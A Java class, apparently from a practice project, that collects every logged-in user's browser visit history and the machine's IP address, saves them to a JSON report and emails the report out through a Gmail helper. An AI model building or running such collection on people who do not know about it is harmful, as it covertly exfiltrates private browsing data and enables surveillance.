package com.jh.iht.java.basics.optimizedreport;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

public class WebActivityToolTracker {

    private static final String BASE_PATH = getBasePathForFiles();

    public static void main(String[] args) {
        List<String> loggedInUsers = SystemUtils.getLoggedInUsers();
        if (!loggedInUsers.isEmpty()) {
            loggedInUsers.forEach(userName -> {
                System.out.println("Processing user: " + userName);
                generateVisitedSitesTimeTrackerRecord(userName);
            });
        }
    }

    private static void generateVisitedSitesTimeTrackerRecord(String userName) {
        String onlyUserName = userName.contains("\\") ? userName.split("\\\\")[1] : userName;
        String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
        String folderCurrentDate = new SimpleDateFormat("ddMMMyyyy").format(new Date());
        String path = BASE_PATH + folderCurrentDate + File.separator;
        String jsonFileName = path + onlyUserName + "_" + timestamp + ".json";

        FileUtils.ensureDirectoryExists(path);

        JSONObject jsonReport = JsonUtils.createJsonReport(userName);
        jsonReport.put("ipaddress", NetworkUtils.getSystemIpAddress());

        // Dynamically detect installed browsers
        List<String> installedBrowsers = BrowserUtils.getInstalledBrowsers();
        JSONArray browsersArray = new JSONArray();
        String browserName = "";
        installedBrowsers.forEach(browser -> {
            JSONObject browserData = new JSONObject();
            browserData.put("browserName", browser);
            JSONArray visitedSitesArray = BrowserUtils.getVisitedSitesForBrowser(browser, userName);
            browserData.put("visitedSites", visitedSitesArray);
            browsersArray.put(browserData);
        });

        jsonReport.put("browsers", browsersArray);
        FileUtils.writeJsonToFile(jsonFileName, jsonReport);
        GmailUtils.sendGmailWithAttachment(jsonFileName,userName);
//        OutlookUtils.sendOutlookWithAttachment(jsonFileName,userName);
    }

    private static String getBasePathForFiles() {
        return System.getProperty("user.home") + File.separator + "Documents" + File.separator + "BrowserHistoryReports" + File.separator;
    }
}
